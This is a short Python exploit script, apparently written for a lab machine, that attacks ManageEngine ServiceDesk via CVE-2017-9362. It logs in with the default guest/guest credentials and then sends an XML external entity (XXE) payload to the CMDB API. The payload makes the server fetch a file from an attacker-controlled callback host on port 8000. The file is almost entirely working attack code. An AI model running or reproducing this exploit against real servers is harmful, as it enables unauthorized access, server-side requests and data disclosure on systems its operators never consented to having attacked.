import requests
import sys
#this is assuming default creds are used 
#https://labs.integrity.pt/advisories/cve-2017-9362/index.html
def login_rider(ip_address,callback_ip):
    login_url = "http://"+ip_address+":8080/j_security_check"
    api_url = "http://"+ip_address+":8080/api/cmdb/ci"
    manage_engine_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://10.10.10.132:8080/HomePage.do?logout=true&logoutSkipNV2Filter=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    login_data={"j_username": "guest", "j_password": "guest", "LDAPEnable": "false", "hidden": "Select a Domain", "hidden": "For Domain", "AdEnable": "false", "DomainCount": "0", "LocalAuth": "No", "LocalAuthWithDomain": "No", "dynamicUserAddition_status": "true", "localAuthEnable": "true", "logonDomainName": "-1", "loginButton": "Login", "checkbox": "checkbox"}
    with requests.Session() as s:
	   shit = s.post(login_url, headers=manage_engine_headers, data=login_data)
	   print(shit.text)
	   xxe_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Referer": "http://10.10.10.132:8080/SetUpWizard.do?forwardTo=apidoc", "Connection": "keep-alive", "Pragma": "no-cache", "Cache-Control": "no-cache"}
	   xxe_data={"OPERATION_NAME": "add", "INPUT_DATA": "<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY sp SYSTEM \"http://"+callback_ip+":8000/test.txt\">\n]>\n<r>&sp;</r>\n"}
	   response = s.post(api_url, headers=xxe_headers, cookies=s.cookies.get_dict(), data=xxe_data)
	   print(response.text)
	   print(s.cookies.get_dict())


login_rider(sys.argv[1],sys.argv[2])
